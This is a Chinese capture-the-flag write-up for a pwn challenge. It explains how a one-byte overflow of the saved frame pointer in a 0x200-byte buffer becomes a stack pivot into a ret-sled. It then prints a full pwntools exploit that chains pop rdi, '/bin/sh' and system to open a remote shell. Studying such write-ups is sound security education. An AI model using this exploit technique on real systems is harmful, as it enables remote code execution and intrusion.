# 机会只有一次

## 题目简述

`vuln` 允许的最大 `num` 为 `0x200`，但真正读取的是 `num+1` 字节：

```c
char buf[0x200];
scanf("%d", &num);
if (num < 0 || num > 0x200)
    exit(0);
read(0, buf, num + 1);
```

输入 `512` 时可以向 0x200 字节缓冲区写入 0x201 字节，恰好多覆盖保存的 `rbp` 的最低 1 字节。程序还包含全局字符串 `/bin/sh`、`system@PLT` 和 `pop rdi; ret` gadget，因此目标是用 off-by-one 完成栈迁移，再执行短 ROP 链。

## 解题过程

覆盖发生后有两次函数返回：

1. `vuln` 的 `leave; ret` 正常回到 `main`，但 `pop rbp` 载入的是最低字节已被改写的旧 `rbp`。
2. `main` 的 `leave; ret` 使用这个伪造的 `rbp`，把 `rsp` 迁移到 `buf` 附近。

把保存的 `rbp` 末字节改为 `\x00` 后，新值为 `saved_rbp & ~0xff`。在题目给定的栈布局中，该地址落入 0x200 字节的 `buf`。由于具体落点只确定到 0x100 对齐区域，在缓冲区前部铺满单字节 `ret` gadget；第二次 `leave` 无论落到滑道中的哪个 8 字节位置，都会逐步执行到末尾的 ROP 链：

```text
ret × 61 → pop rdi; ret → "/bin/sh" → system@PLT
```

利用脚本如下：

```python
from pwn import *

context.arch = "amd64"
elf = context.binary = ELF("./pwn", checksec=False)

HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 10000)
io = remote(HOST, PORT)

rop = ROP(elf)
ret = rop.find_gadget(["ret"]).address
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
bin_sh = next(elf.search(b"/bin/sh\x00"))

chain = flat(pop_rdi, bin_sh, elf.plt.system)
ret_count = (0x200 - len(chain)) // 8
payload = p64(ret) * ret_count + chain
assert len(payload) == 0x200

# 第 0x201 字节只修改保存的 rbp 的最低字节。
payload += b"\x00"

io.sendlineafter(b"How many bytes do you want to write?\n", b"512")
io.sendafter(b"I can give you one more\n", payload)
io.interactive()
```

这里依赖题目二进制的具体栈帧相对位置。调试时应在两次 `leave` 前分别检查 `rbp`、`rsp` 和 `buf` 地址，确认清零低字节后确实落入 ret 滑道。

## 方法总结

off-by-one 虽然只能改写一个字节，但保存的帧指针会在调用者的下一次 `leave` 中变成栈迁移目标。利用的三个条件是：清零后地址落入可控缓冲区、缓冲区内有覆盖不确定落点的 ret 滑道、程序已有 `system` 和 `/bin/sh`。原始脚本中的三个硬编码地址均可从 ELF 自动解析，比赛临时地址无需保留。
